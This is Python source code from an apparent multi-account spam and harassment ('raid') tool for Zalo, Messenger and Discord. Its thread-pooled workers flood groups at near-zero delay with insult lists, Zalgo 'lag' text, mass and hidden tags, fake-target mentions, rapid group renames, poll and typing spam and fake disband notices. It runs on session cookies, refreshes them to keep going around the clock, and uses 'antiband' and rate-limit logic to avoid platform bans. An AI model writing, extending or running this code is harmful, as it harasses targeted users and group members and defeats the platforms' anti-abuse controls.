                client.get_threads(use_cache=False, latest_msgs_out=inbox_latest)
                if not self.is_initial_seed_done:
                    self.is_initial_seed_done = True
                    for item in inbox_latest:
                        tid = str(item.get("thread_id") or "").strip()
                        mid = str(item.get("id") or "").strip()
                        cleaned_cmd = self._clean_messenger_snippet_cmd(item.get("content") or "")
                        if tid and cleaned_cmd:
                            if is_direct_user_command_text(cleaned_cmd):
                                self._process_incoming_item(client, acc_row, item)
                            else:
                                self.seen_msg_ids.append(f"{tid}:{mid}:{cleaned_cmd[:40]}")
                else:
                    for item in inbox_latest:
                        if self.stop_ev.is_set():
                            break
                        self._process_incoming_item(client, acc_row, item)

                self.stop_ev.wait(1.6)
            except Exception as e:
                if "Checkpoint" in str(e):
                    self.ws_status = "Cần kiểm tra lại Cookie Facebook"
                    self.stop_ev.wait(20.0)
                else:
                    self.stop_ev.wait(2.5)

# ĐỘNG CƠ ĐA LUỒNG CHẠY 2-5+ ĐOẠN CHAT SONG SONG ỔN ĐỊNH KHÔNG LAG
_TURBO_SEND_POOL = ThreadPoolExecutor(max_workers=512)


LAG_COMBINING_MARKS = ["̀", "́", "̂", "̃", "̄", "̆", "̇", "̈", "̉", "̊", "̋", "̌", "̣", "̧", "̨"]
VIP_ICON_FLOOD_POOL = ["🔥", "⚡", "👑", "💀", "☠️", "😈", "💥", "🚀", "🌪️", "🐉", "⚔️", "🛡️"]

def transform_special_mode_packet(raw_text, mode, step_idx=0):
    """Biến đổi gói tin theo các chế độ đặc biệt từ 3 file zip (3app vip.zip, 1appsieuvip.zip, 5appbytrantu.zip):
    - treo_so / so_tag: Tự động đánh số thứ tự tăng dần '1. ...', '2. ...' hoặc gửi dãy số liên hoàn.
    - code_lag: Phủ ký tự tổ hợp Zalgo/Lag siêu nặng từ codelag.txt.
    - nhay_2c: Ghép 2 câu sát thương liên tiếp trên 1 nhịp gửi (2c.txt).
    - nhay_icon: Rải chuỗi ký hiệu biểu cảm dày đặc từ nhayicon.txt.
    - nhay_fake_ten: Giả lập định dạng nhắc tên kép siêu gắt."""
    txt = str(raw_text or "").strip()
    if mode in ("treo_so", "so_tag", "so_tag_faketen"):
        if not txt.isdigit():
            return f"{step_idx + 1}. {txt}"
        return str(step_idx + 1)
    if mode == "code_lag":
        out_chars = []
        for ch in txt[:180]:
            out_chars.append(ch)
            if not ch.isspace():
                out_chars.extend(random.sample(LAG_COMBINING_MARKS, 3))
        return "".join(out_chars)
    if mode == "nhay_icon":
        icons_str = "".join(random.choices(VIP_ICON_FLOOD_POOL, k=6))
        return f"{icons_str} {txt} {icons_str}" if txt else icons_str * 3
    if mode in ("nhay_fake_ten", "so_tag_faketen"):
        return f"@[👑 MỤC TIÊU #{step_idx + 1}] ➔ {txt}"
    return txt

def box_target_worker(client, acc_id, plat, target, blocks, runtime_opts,
                      stop_ev, counter, lock, stagger_sec=0.0, active_box_count=1):
    target_type = target.get("type", "group")
    target_id = str(target.get("id"))

    # Chỉ lọc cứng theo tài khoản khi người dùng chủ động bật strict_bind=True
    if target.get("strict_bind"):
        assigned_accs = target.get("assigned_acc_ids") or target.get("acc_ids")
        if assigned_accs and isinstance(assigned_accs, (list, tuple, set)):
            clean_assigned = {int(x) for x in assigned_accs if str(x).isdigit()}
            if clean_assigned and int(acc_id) not in clean_assigned:
                return

    start_global_epoch, start_box_epoch = get_current_epochs(target_id)
    set_campaign_thread_context(stop_ev, start_global_epoch, start_box_epoch, target_id)

    if stagger_sec > 0:
        if interruptible_wait(stop_ev, stagger_sec, start_global_epoch, start_box_epoch, target_id):
            return

    is_discord_target = (target_type == "discord_channel")
    is_messenger_target = (target_type in ("messenger_thread", "messenger_group", "messenger_user"))
    is_zalo_target = not is_discord_target and not is_messenger_target
    if (plat == "zalo" and not is_zalo_target) or (plat == "discord" and not is_discord_target) or (plat == "messenger" and not is_messenger_target):
        return

    is_group = (target_type == "group") or bool(runtime_opts.get("tag_users")) or bool(runtime_opts.get("tag_all"))
    b_idx = 0
    color_counter = random.randint(0, 3)
    target_parsed_cache = {}

    def _fire_single_packet(pkt_text, eff_m, eff_all, c_mode, f_color, heading_f, ab_f, em_f, ic_cnt, strip_num_f, col_off):
        if is_task_stopped_fast(stop_ev, start_global_epoch, start_box_epoch, target_id):
            return
        with SYSTEM_CFG_LOCK:
            g_ic = int(SYSTEM_RUNTIME_CONFIG.get("icon_count", ic_cnt))
            g_em = bool(SYSTEM_RUNTIME_CONFIG.get("use_emoji", em_f))
            g_fs = SYSTEM_RUNTIME_CONFIG.get("font_style", runtime_opts.get("font_style", "big_bold"))
        if not g_em or g_ic <= 0 or not em_f or int(ic_cnt or 0) <= 0:
            em_f = False
            ic_cnt = 0
            pkt_text = strip_trailing_icons_when_zero(pkt_text)
        else:
            ic_cnt = int(ic_cnt)
        f_style = runtime_opts.get("font_style") or g_fs
        t0_s = time.perf_counter()
        try:
            if plat == "zalo":
                # Tự động đồng bộ phiên Zalo mới nhất từ Pool mỗi 60s để treo 24/7 xuyên đêm không bao giờ rớt khi Cookie/zpw_enk tự gia hạn
                now_f = time.time()
                if now_f - getattr(client, "_last_pool_sync_ts", 0.0) > 60.0:
                    client._last_pool_sync_ts = now_f
                    try:
                        latest_acc = get_account_from_ram_by_id(acc_id)
                        if latest_acc and latest_acc.get("cookies"):
                            fresh_c = Zalo.get_pooled_client(
                                latest_acc.get("imei") or client.imei,
                                latest_acc.get("cookies"),
                                user_agent=latest_acc.get("user_agent") or client.user_agent,
                                zpw_enk_hint=latest_acc.get("zpw_enk") or client.secret_key or "",
                                uid_hint=latest_acc.get("uid") or client.uid or ""
                            )
                            if fresh_c and fresh_c.secret_key:
                                client.secret_key = fresh_c.secret_key
                                client.cookies_dict = fresh_c.cookies_dict
                                client._sync_cookie_headers()
                    except Exception:
                        pass
                client.send_adv(
                    pkt_text, target_id, color_mode=c_mode, fixed_color=f_color,
                    is_group=is_group, mentions=(eff_m if is_group else None),
                    tag_all=(eff_all if is_group else False), is_heading=heading_f,
                    color_offset=col_off, antiband=ab_f,
                    use_emoji=em_f, icon_count=ic_cnt,
                    auto_retry_thread_type=True, strip_line_num=strip_num_f,
                    hide_tag_all=bool(runtime_opts.get("hide_tag_all", True)),
                    hide_tag_name=bool(runtime_opts.get("hide_tag_name", True)),
                    font_style=f_style
                )
            elif plat == "messenger":
                client.send_message(
                    target_id, pkt_text, is_group=True, mentions=eff_m,
                    tag_all=eff_all, antiband=ab_f,
                    use_emoji=em_f, icon_count=ic_cnt,
                    is_heading=heading_f, strip_line_num=strip_num_f,
                    stop_ev=stop_ev, start_global_epoch=start_global_epoch, start_box_epoch=start_box_epoch
                )
            else:
                msg_ln = (pkt_text + " " + build_unique_zalo_icons(ic_cnt)) if (em_f and ic_cnt > 0) else pkt_text
                sent_res = client.send_message(
                    target_id, msg_ln, color_mode=c_mode,
                    fixed_color=f_color, antiband=ab_f,
                    mentions=eff_m, tag_all=eff_all,
                    strip_line_num=strip_num_f, is_heading=heading_f,
                    stop_ev=stop_ev, start_global_epoch=start_global_epoch, start_box_epoch=start_box_epoch
                )
                if sent_res is None:
                    return
            lat_ms = (time.perf_counter() - t0_s) * 1000.0
            with lock:
                counter["sent"] += 1
            HEALTH_MGR.report_success(acc_id, latency_ms=lat_ms, channel_id=target_id)
        except Exception as ex_inner:
            err_s = str(ex_inner)
            if "429:RateLimit:" in err_s:
                parts = err_s.split(":")
                try:
                    ra = float(parts[2])
                except Exception:
                    ra = 1.5
                HEALTH_MGR.report_rate_limit(acc_id, ra, reason=err_s, channel_id=target_id)
            elif "AuthError" in err_s:
                HEALTH_MGR.report_error(acc_id, err_s, is_auth_error=True)
            else:
                HEALTH_MGR.report_error(acc_id, err_s, is_auth_error=False, channel_id=target_id)

    while not is_task_stopped_fast(stop_ev, start_global_epoch, start_box_epoch, target_id):
        if not blocks:
            break

        antiband = bool(runtime_opts.get("antiband", True))
        antidieall = bool(runtime_opts.get("antidieall", True))
        delay = float(runtime_opts.get("delay", 0.0))
        use_emoji = False
        icon_count = 0
        is_heading = bool(runtime_opts.get("is_heading", True))
        raw_mode = runtime_opts.get("mode", "fast")
        mode = {
            "combo3": "combo_lien_thanh",
            "nhay2c": "nhay_2c",
            "faketen": "so_tag_faketen",
            "nhayicon": "nhay_icon",
            "chui": "idea_mess",
            "typing_loop": "nhay_typing",
            "nhay_tenbox": "nhay_namebox",
            "zalo_bank": "zalo_cardbank",
            "nen_mqtt": "nhay_theme",
            "set_nickname": "mess_nickname",
            "anall": "nhay_tag_all_an",
            "antan": "nhay_tag_ten_an",
        }.get(raw_mode, raw_mode)
        if mode in ("nhay_poll", "nhay_namebox"):
            delay = 0.0
        color_mode = runtime_opts.get("color_mode", "word_rainbow")
        fixed_color = runtime_opts.get("fixed_color", "red")
        tag_users = runtime_opts.get("tag_users") or []
        tag_all = bool(runtime_opts.get("tag_all", False))
        strip_line_num = bool(runtime_opts.get("strip_line_num", True)) or (mode == "treo_nhay")

        tok_for_check = getattr(client, "token", None) if plat == "discord" else None
        if antidieall and delay > 0.0:
            ok_send, wait_sec = HEALTH_MGR.can_send(acc_id, channel_id=target_id, platform=plat, token=tok_for_check)
            if not ok_send:
                if interruptible_wait(stop_ev, min(0.15, max(0.02, wait_sec)), start_global_epoch, start_box_epoch, target_id):
                    break
                continue

        raw = blocks[b_idx % len(blocks)]
        b_idx += 1

        eff_mentions = list(tag_users)
        eff_tag_all = tag_all
        clean_raw = raw

        if "@" in raw:
            cache_key = (plat, target_id, raw[:100], raw[-80:])
            if cache_key not in target_parsed_cache:
                if plat == "zalo":
                    stripped_txt, auto_m, auto_all = extract_trailing_tags_and_resolve(
                        raw, incoming_mentions=None, zalo_client=client, group_id=target_id
                    )
                elif plat == "messenger":
                    stripped_txt, auto_m, auto_all = extract_trailing_tags_and_resolve(
                        raw, incoming_mentions=None, messenger_client=client, messenger_thread_id=target_id
                    )
                else:
                    stripped_txt, auto_m, auto_all = extract_trailing_tags_and_resolve(
                        raw, incoming_mentions=None, discord_client=client, discord_channel_id=target_id
                    )
                safe_txt = stripped_txt if (stripped_txt and re.sub(r"<@(?:!|&)?\d+>", "", stripped_txt).strip()) else raw
                target_parsed_cache[cache_key] = (safe_txt, auto_m, auto_all)
            c_txt, auto_m, auto_all = target_parsed_cache[cache_key]
            clean_raw = c_txt
            if auto_all:
                eff_tag_all = True
                is_group = True
            for am in auto_m:
                is_group = True
                if not any(str(x.get("uid") or x.get("id")) == str(am["uid"]) for x in eff_mentions):
                    eff_mentions.append(am)

        try:
            if mode == "auto_shuffle" and len(blocks) > 1:
                raw = random.choice(blocks)
                clean_raw = strip_leading_line_number(raw) if strip_line_num else raw

            if mode in ("nhay_tag_all", "nhay_tag_all_an", "nhay_tag_ten_an", "battrinh_all_box"):
                eff_tag_all = True
                is_group = True

            if mode in ("raid_burst", "sieu_xa_nhieu_nhom"):
                color_mode = "word_rainbow"
                is_heading = True

            if mode == "combo_lien_thanh" and len(blocks) >= 2:
                c1 = strip_leading_line_number(blocks[(b_idx - 1) % len(blocks)])
                c2 = strip_leading_line_number(blocks[b_idx % len(blocks)])
                c3 = strip_leading_line_number(blocks[(b_idx + 1) % len(blocks)])
                clean_raw = f"{c1}\n{c2}\n{c3}"
                b_idx += 2
            elif mode == "nhay_2c" and len(blocks) >= 2:
                c1 = strip_leading_line_number(blocks[(b_idx - 1) % len(blocks)])
                c2 = strip_leading_line_number(blocks[b_idx % len(blocks)])
                clean_raw = f"{c1} — {c2}"
                b_idx += 1
            elif mode in ("treo_so", "so_tag", "so_tag_faketen", "code_lag", "nhay_icon", "nhay_fake_ten"):
                clean_raw = transform_special_mode_packet(clean_raw, mode, step_idx=b_idx - 1)
                if mode in ("so_tag", "so_tag_faketen", "nhay_fake_ten"):
                    eff_tag_all = True
                    is_group = True
            elif plat == "messenger" and mode in ("nhay_top", "reo_story"):
                text_item = strip_leading_line_number(clean_raw) if strip_line_num else clean_raw
                t_uid_0 = eff_mentions[0]["uid"] if eff_mentions else ""
                t_name_0 = eff_mentions[0].get("name", "") if eff_mentions else ""
                if mode == "nhay_top":
                    client.comment_group_post(target_id, text_item, tag_uid=t_uid_0, tag_name=t_name_0)
                else:
                    client.post_story_mention(text_item, target_uid=t_uid_0)
                with lock:
                    counter["sent"] += 1
                HEALTH_MGR.report_success(acc_id, channel_id=target_id)
                continue

            if plat == "zalo" and mode in ("nhay_poll", "nhay_typing", "nhay_namebox", "nhay_theme", "zalo_todo", "zalo_cardbank", "share_contact", "reaction_storm", "zalo_gif", "nhay_giaitan", "treo_sticker"):
                text_item = strip_leading_line_number(clean_raw) if strip_line_num else clean_raw
                if mode == "nhay_poll":
                    if "|" in text_item:
                        q_p, opt_p = text_item.split("|", 1)
                        opts_l = [x.strip() for x in opt_p.replace(";", "|").split("|") if x.strip()]
                    elif len(blocks) >= 3:
                        q_p = text_item
                        o1 = strip_leading_line_number(blocks[b_idx % len(blocks)]) if strip_line_num else blocks[b_idx % len(blocks)]
                        o2 = strip_leading_line_number(blocks[(b_idx + 1) % len(blocks)]) if strip_line_num else blocks[(b_idx + 1) % len(blocks)]
                        opts_l = [o1.strip()[:60] or "Đồng ý #1", o2.strip()[:60] or "Đồng ý #2"]
                    else:
                        q_p = text_item
                        opts_l = [f"{text_item[:35]} #1", f"{text_item[:35]} #2"]
                    client.create_poll(target_id, q_p.strip(), opts_l)
                elif mode == "nhay_typing":
                    client.send_typing(target_id, is_group=is_group)
                elif mode == "nhay_namebox":
                    client.change_group_name(target_id, text_item)
                elif mode == "nhay_theme":
                    client.change_group_theme(target_id, text_item if text_item else None, is_group=is_group)
                elif mode == "zalo_todo":
                    ass_uids = [m["uid"] for m in eff_mentions] if eff_mentions else [client.uid]
                    client.send_todo(target_id, text_item, assignees=ass_uids)
                elif mode == "zalo_cardbank":
                    parts_b = [p.strip() for p in text_item.split("|")]
                    b_bin = int(parts_b[0]) if (parts_b and parts_b[0].isdigit()) else 970422
                    b_num = parts_b[1] if len(parts_b) > 1 else "9999999999"
                    b_name = parts_b[2] if len(parts_b) > 2 else "ACCOUNT VIP"
                    client.send_card_bank(target_id, bin_bank=b_bin, num_acc=b_num, name_acc=b_name, is_group=is_group)
                elif mode == "share_contact":
                    c_uid = eff_mentions[0]["uid"] if eff_mentions else client.uid
                    client.send_business_card(target_id, target_uid=c_uid, is_group=is_group)
                elif mode == "zalo_gif":
                    client.send_gif_or_sticker(
                        target_id, text_msg=text_item, is_group=is_group,
                        mentions=(eff_mentions if is_group else None),
                        tag_all=(eff_tag_all if is_group else False),
                        color_mode=color_mode or "word_rainbow", fixed_color=fixed_color
                    )
                elif mode == "nhay_giaitan":
                    client.spam_group_disband_notification(target_id, group_name=text_item or "Lũ vdanh", send_inbox_alert=False)
                elif mode == "treo_sticker":
                    client.send_native_sticker(target_id, keyword=text_item, is_group=is_group)
                elif mode == "reaction_storm":
                    client.send_adv(
                        text_item, target_id, color_mode=color_mode, fixed_color=fixed_color,
                        is_group=is_group, mentions=(eff_mentions if is_group else None),
                        tag_all=(eff_tag_all if is_group else False), is_heading=is_heading,
                        color_offset=color_counter, antiband=antiband,
                        use_emoji=use_emoji, icon_count=icon_count,
                        auto_retry_thread_type=True, strip_line_num=strip_line_num
                    )
                with lock:
                    counter["sent"] += 1
                HEALTH_MGR.report_success(acc_id, channel_id=target_id)
            elif plat == "discord" and mode in ("nhay_poll", "nhay_typing", "reaction_storm", "discord_embed_vip", "discord_status_rotator"):
                text_item = strip_leading_line_number(clean_raw) if strip_line_num else clean_raw
                if mode == "nhay_poll":
                    if "|" in text_item:
                        q_p, opt_p = text_item.split("|", 1)
                        opts_l = [x.strip() for x in opt_p.replace(";", "|").split("|") if x.strip()]
                    else:
                        q_p = text_item
                        opts_l = [f"{text_item[:25]} #1", f"{text_item[:25]} #2"]
                    client.send_poll_discord(target_id, q_p.strip(), opts_l)
                elif mode == "nhay_typing":
                    client.send_typing(target_id)
                elif mode == "discord_status_rotator":
                    client.set_custom_status(text_item[:80])
                    client.send_message(
                        target_id, text_item, color_mode=color_mode,
                        fixed_color=fixed_color, antiband=antiband,
                        mentions=eff_mentions, tag_all=eff_tag_all,
                        strip_line_num=strip_line_num, is_heading=is_heading
                    )
                elif mode == "discord_embed_vip":
                    art_txt = f"# 🔥 **{text_item}**\n> ⚡ *{text_item}*"
                    if use_emoji and icon_count > 0:
                        art_txt += " " + build_unique_zalo_icons(icon_count)
                    client.send_message(
                        target_id, art_txt, color_mode="none",
                        fixed_color=fixed_color, antiband=antiband,
                        mentions=eff_mentions, tag_all=eff_tag_all,
                        strip_line_num=False, is_heading=False
                    )
                elif mode == "reaction_storm":
                    sent_obj = client.send_message(
                        target_id, text_item, color_mode=color_mode,
                        fixed_color=fixed_color, antiband=antiband,
                        mentions=eff_mentions, tag_all=eff_tag_all,
                        strip_line_num=strip_line_num, is_heading=is_heading
                    )
                    if isinstance(sent_obj, dict) and sent_obj.get("id"):
                        for em_r in ("🔥", "⚡", "👑"):
                            client.add_reaction(target_id, sent_obj["id"], em_r)
                with lock:
                    counter["sent"] += 1
                HEALTH_MGR.report_success(acc_id, channel_id=target_id)
            elif plat == "messenger" and mode in ("nhay_poll", "nhay_theme", "nhay_typing", "share_link", "share_contact", "nhay_namebox", "mess_nickname"):
                text_item = strip_leading_line_number(clean_raw) if strip_line_num else clean_raw
                if mode == "nhay_poll":
                    if "|" in text_item:
                        q_p, opt_p = text_item.split("|", 1)
                        opts_l = [x.strip() for x in opt_p.replace(";", "|").split("|") if x.strip()]
                    else:
                        q_p = text_item
                        opts_l = [f"{text_item[:25]} #1", f"{text_item[:25]} #2"]
                    client.send_poll_mqtt(target_id, q_p.strip(), opts_l)
                elif mode == "nhay_theme":
                    client.set_theme_mqtt(target_id, text_item if text_item else None)
                elif mode == "nhay_typing":
                    client.send_typing_mqtt(target_id, True, is_group=True)
                elif mode == "share_link":
                    if "|" in text_item:
                        u_part, t_part = text_item.split("|", 1)
                    else:
                        u_part, t_part = "https://www.facebook.com/", text_item
                    client.share_link_mqtt(target_id, u_part.strip(), t_part.strip())
                elif mode == "share_contact":
                    c_uid = eff_mentions[0]["uid"] if eff_mentions else client.uid
                    client.share_contact_mqtt(target_id, c_uid, text_item)
                elif mode == "nhay_namebox":
                    client.rename_group(target_id, text_item)
                elif mode == "mess_nickname":
                    c_uid = eff_mentions[b_idx % len(eff_mentions)]["uid"] if eff_mentions else client.uid
                    client.change_nickname(target_id, c_uid, text_item[:45])
                with lock:
                    counter["sent"] += 1
                HEALTH_MGR.report_success(acc_id, channel_id=target_id)
            elif mode == "treo_ngon":
                text = clean_raw.replace("\r\n", "\n").replace("\r", "\n")
                _fire_single_packet(
                    text, eff_mentions, eff_tag_all, color_mode, fixed_color,
                    is_heading, antiband, use_emoji, icon_count, False, color_counter
                )
                wave_key = runtime_opts.get("_wave_key", "")
                if wave_key:
                    WaveFairnessEngine.record_acc_sent(wave_key, acc_id)
                color_counter += 1

            elif mode == "treo_nhay":
                lines = []
                for raw_ln in clean_raw.split("\n"):
                    s_ln = raw_ln.strip()
                    if s_ln:
                        c_ln = strip_leading_line_number(s_ln)
                        if c_ln:
                            lines.append(c_ln)

                for ln in lines:
                    if is_task_stopped_fast(stop_ev, start_global_epoch, start_box_epoch, target_id):
                        break
                    delay = float(runtime_opts.get("delay", delay))
                    color_mode = runtime_opts.get("color_mode", color_mode)
                    fixed_color = runtime_opts.get("fixed_color", fixed_color)
                    icon_count = int(runtime_opts.get("icon_count", icon_count))
                    use_emoji = bool(runtime_opts.get("use_emoji", use_emoji))
                    is_heading = bool(runtime_opts.get("is_heading", is_heading))
                    antiband = bool(runtime_opts.get("antiband", antiband))

                    if antidieall and delay > 0.0:
                        ok_s, w_s = HEALTH_MGR.can_send(acc_id, channel_id=target_id, platform=plat, token=tok_for_check)
                        if not ok_s:
                            if interruptible_wait(stop_ev, min(0.15, max(0.02, w_s)), start_global_epoch, start_box_epoch, target_id):
                                break
                            continue

                    wave_key = runtime_opts.get("_wave_key", "")
                    if wave_key:
                        fair_w = WaveFairnessEngine.get_fair_pacing_pause(wave_key, acc_id, delay)
                        if fair_w > 0.0:
                            if interruptible_wait(stop_ev, fair_w, start_global_epoch, start_box_epoch, target_id):
                                break

                    _fire_single_packet(
                        ln, eff_mentions, eff_tag_all, color_mode, fixed_color,
                        is_heading, antiband, use_emoji, icon_count, True, color_counter
                    )
                    if wave_key:
                        WaveFairnessEngine.record_acc_sent(wave_key, acc_id)
                    color_counter += 1
                    step_d = HEALTH_MGR.get_adaptive_delay(
                        acc_id, delay, antiband=antiband, platform=plat, text_len=len(ln), active_box_count=active_box_count
                    )
                    if step_d > 0.0:
                        if interruptible_wait(stop_ev, step_d, start_global_epoch, start_box_epoch, target_id):
                            break
                continue

            else:
                wave_key = runtime_opts.get("_wave_key", "")
                if wave_key:
                    fair_w = WaveFairnessEngine.get_fair_pacing_pause(wave_key, acc_id, delay)
                    if fair_w > 0.0:
                        if interruptible_wait(stop_ev, fair_w, start_global_epoch, start_box_epoch, target_id):
                            break
                text = strip_leading_line_number(clean_raw) if strip_line_num else clean_raw
                _fire_single_packet(
                    text, eff_mentions, eff_tag_all, color_mode, fixed_color,
                    is_heading, antiband, use_emoji, icon_count, strip_line_num, color_counter
                )
                if wave_key:
                    WaveFairnessEngine.record_acc_sent(wave_key, acc_id)
                color_counter += 1

        except Exception as e:
            err_str = str(e)
            if "TaskStoppedAbort" in err_str or "ChannelForbidden:" in err_str:
                break
            elif "429:RateLimit:" in err_str:
                parts = err_str.split(":")
                try:
                    retry_after = float(parts[2])
                except Exception:
                    retry_after = 0.4
                HEALTH_MGR.report_rate_limit(acc_id, retry_after, reason=err_str, channel_id=target_id)
            elif "AuthError" in err_str:
                HEALTH_MGR.report_error(acc_id, err_str, is_auth_error=True)
            else:
                HEALTH_MGR.report_error(acc_id, err_str, is_auth_error=False, channel_id=target_id)

        if is_task_stopped_fast(stop_ev, start_global_epoch, start_box_epoch, target_id):
            break
        if mode == "nhay_poll":
            # Treo Poll 0.0s KHÔNG CÓ THỜI GIAN NGHỈ: bắn liên hoàn ngay lập tức nhưng vẫn kiểm tra Stop mỗi vòng!
            continue
        if mode == "nhay_namebox":
            if interruptible_wait(stop_ev, max(delay, 0.45), start_global_epoch, start_box_epoch, target_id):
                break
            continue
        actual_delay = HEALTH_MGR.get_adaptive_delay(
            acc_id, delay, antiband=antiband, platform=plat, text_len=len(clean_raw), active_box_count=active_box_count
        )
        if actual_delay > 0.0:
            if interruptible_wait(stop_ev, actual_delay, start_global_epoch, start_box_epoch, target_id):
                break
    clear_campaign_thread_context()

def multi_box_shard_worker(client, acc_id, plat, shard_targets, blocks, runtime_opts,
                           stop_ev, counter, lock, stagger_sec=0.0, active_box_count=1):
    """Động Cơ Phân Mảnh Vòng Tròn Siêu Tốc (High-Velocity Non-Blocking Ring Shard Worker ):
    - Chuyên trị bài toán 50+ Acc × 200+ Nhóm cùng lúc ở chế độ Delay = 0s (Treo ngôn .g, Treo nhây .n, Siêu xả .xa).
    - Thay vì tạo 10.000 luồng OS gây nghẽn GIL hoặc để 1 nhóm dính 429 làm dừng tạm thời cả luồng,
      mỗi Shard Worker xoay vòng liên hoàn qua các nhóm được giao trong 0ms:
      + Nhóm nào sẵn sàng là phang ngay lập tức!
      + Nhóm nào vừa vướng cooldown ngắn (0.15s) thì tự động lướt qua (0ms, không sleep!) để bắn nhóm kế tiếp ngay,
        nhờ đó tốc độ gửi tổng thể luôn đạt cực đại và treo ngôn / treo nhây cực mượt không bao giờ khựng hay đơ!"""
    if not shard_targets or not blocks:
        return
    if len(shard_targets) == 1:
        return box_target_worker(
            client, acc_id, plat, shard_targets[0], blocks, runtime_opts,
            stop_ev, counter, lock, stagger_sec=stagger_sec, active_box_count=active_box_count
        )

    start_global_epoch, _ = get_current_epochs(None)
    if stagger_sec > 0:
        if interruptible_wait(stop_ev, stagger_sec, start_global_epoch, None, None):
            return

    valid_targets = []
    box_epochs = {}
    for t in shard_targets:
        t_type = t.get("type", "group")
        t_id = str(t.get("id") or "").strip()
        if not t_id:
            continue
        is_discord_t = (t_type == "discord_channel")
        is_mess_t = (t_type in ("messenger_thread", "messenger_group", "messenger_user"))
        is_zalo_t = not is_discord_t and not is_mess_t
        if (plat == "zalo" and not is_zalo_t) or (plat == "discord" and not is_discord_t) or (plat == "messenger" and not is_mess_t):
            continue
        valid_targets.append(t)
        _, b_ep = get_current_epochs(t_id)
        box_epochs[t_id] = b_ep

    if not valid_targets:
        return

    dead_targets = set()
    target_skip_until = defaultdict(float)
    target_b_idx = defaultdict(int)
    color_counter = random.randint(0, 3)

    while not is_task_stopped_fast(stop_ev, start_global_epoch, None, None):
        if len(dead_targets) >= len(valid_targets):
            break

        antiband = bool(runtime_opts.get("antiband", True))
        delay = float(runtime_opts.get("delay", 0.0))
        use_emoji = False
        icon_count = 0
        is_heading = bool(runtime_opts.get("is_heading", True))
        raw_mode = runtime_opts.get("mode", "fast")
        mode = {
            "combo3": "combo_lien_thanh",
            "nhay2c": "nhay_2c",
            "faketen": "so_tag_faketen",
            "nhayicon": "nhay_icon",
            "chui": "idea_mess",
            "typing_loop": "nhay_typing",
            "nhay_tenbox": "nhay_namebox",
            "zalo_bank": "zalo_cardbank",
            "nen_mqtt": "nhay_theme",
            "set_nickname": "mess_nickname",
            "anall": "nhay_tag_all_an",
            "antan": "nhay_tag_ten_an",
        }.get(raw_mode, raw_mode)
        if mode in ("nhay_poll", "nhay_namebox"):
            delay = 0.0
        color_mode = runtime_opts.get("color_mode", "word_rainbow")
        fixed_color = runtime_opts.get("fixed_color", "red")
        tag_users = runtime_opts.get("tag_users") or []
        tag_all = bool(runtime_opts.get("tag_all", False))
        strip_line_num = bool(runtime_opts.get("strip_line_num", True)) or (mode == "treo_nhay")
        wave_key = runtime_opts.get("_wave_key", "")

        if mode in ("nhay_tag_all", "nhay_tag_all_an", "nhay_tag_ten_an", "battrinh_all_box"):
            tag_all = True
        if mode in ("raid_burst", "sieu_xa_nhieu_nhom"):
            color_mode = "word_rainbow"
            is_heading = True

        fired_in_pass = 0
        for t in valid_targets:
            t_id = str(t.get("id") or t.get("thread_id") or "")
            if t_id in dead_targets:
                continue
            if is_task_stopped_fast(stop_ev, start_global_epoch, box_epochs.get(t_id), t_id):
                dead_targets.add(t_id)
                continue

            now_t = time.time()
            if now_t < target_skip_until[t_id]:
                continue

            cur_idx = target_b_idx[t_id]
            step_inc = 1
            raw = blocks[cur_idx % len(blocks)]

            if mode == "auto_shuffle" and len(blocks) > 1:
                raw = random.choice(blocks)
            elif mode == "combo_lien_thanh" and len(blocks) >= 2:
                c1 = strip_leading_line_number(blocks[cur_idx % len(blocks)])
                c2 = strip_leading_line_number(blocks[(cur_idx + 1) % len(blocks)])
                c3 = strip_leading_line_number(blocks[(cur_idx + 2) % len(blocks)])
                raw = f"{c1}\n{c2}\n{c3}"
                step_inc = 3
            elif mode == "nhay_2c" and len(blocks) >= 2:
                c1 = strip_leading_line_number(blocks[cur_idx % len(blocks)])
                c2 = strip_leading_line_number(blocks[(cur_idx + 1) % len(blocks)])
                raw = f"{c1} — {c2}"
                step_inc = 2
            elif mode in ("treo_so", "so_tag", "so_tag_faketen", "code_lag", "nhay_icon", "nhay_fake_ten"):
                raw = transform_special_mode_packet(raw, mode, step_idx=cur_idx)
                if mode in ("so_tag", "so_tag_faketen", "nhay_fake_ten"):
                    tag_all = True

            with SYSTEM_CFG_LOCK:
                g_ic = int(SYSTEM_RUNTIME_CONFIG.get("icon_count", icon_count))
                g_em = bool(SYSTEM_RUNTIME_CONFIG.get("use_emoji", use_emoji))
                g_fs = SYSTEM_RUNTIME_CONFIG.get("font_style", runtime_opts.get("font_style", "big_bold"))
            if not g_em or g_ic <= 0 or not use_emoji or int(icon_count or 0) <= 0:
                eff_em = False
                eff_ic = 0
            else:
                eff_em = True
                eff_ic = int(icon_count)
            f_style = runtime_opts.get("font_style") or g_fs

            if mode == "treo_ngon":
                pkt_text = raw.replace("\r\n", "\n").replace("\r", "\n")
                s_num_flag = False
            else:
                pkt_text = strip_leading_line_number(raw, preserve_indent=True) if strip_line_num else raw
                s_num_flag = strip_line_num

            if not eff_em or eff_ic <= 0:
                pkt_text = strip_trailing_icons_when_zero(pkt_text)

            is_grp = (t.get("type", "group") == "group") or bool(tag_users) or bool(tag_all)
            t0_s = time.perf_counter()
            try:
                if plat == "zalo":
                    if mode == "nhay_poll":
                        if "|" in pkt_text:
                            q_p, opt_p = pkt_text.split("|", 1)
                            opts_l = [x.strip() for x in opt_p.replace(";", "|").split("|") if x.strip()]
                        elif len(blocks) >= 3:
                            q_p = pkt_text
                            o1 = strip_leading_line_number(blocks[(cur_idx + 1) % len(blocks)])
                            o2 = strip_leading_line_number(blocks[(cur_idx + 2) % len(blocks)])
                            opts_l = [o1.strip()[:60] or "Đồng ý #1", o2.strip()[:60] or "Đồng ý #2"]
                        else:
                            q_p = pkt_text
                            opts_l = [f"{pkt_text[:35]} #1", f"{pkt_text[:35]} #2"]
                        client.create_poll(t_id, q_p.strip(), opts_l)
                    elif mode == "nhay_typing":
                        client.send_typing(t_id, is_group=is_grp)
                    elif mode == "nhay_namebox":
                        client.change_group_name(t_id, pkt_text)
                    elif mode == "nhay_theme":
                        client.change_group_theme(t_id, pkt_text if pkt_text else None, is_group=is_grp)
                    elif mode == "zalo_todo":
                        ass_uids = [m["uid"] for m in tag_users] if tag_users else [client.uid]
                        client.send_todo(t_id, pkt_text, assignees=ass_uids)
                    elif mode == "zalo_cardbank":
                        parts_b = [p.strip() for p in pkt_text.split("|")]
                        b_bin = int(parts_b[0]) if (parts_b and parts_b[0].isdigit()) else 970422
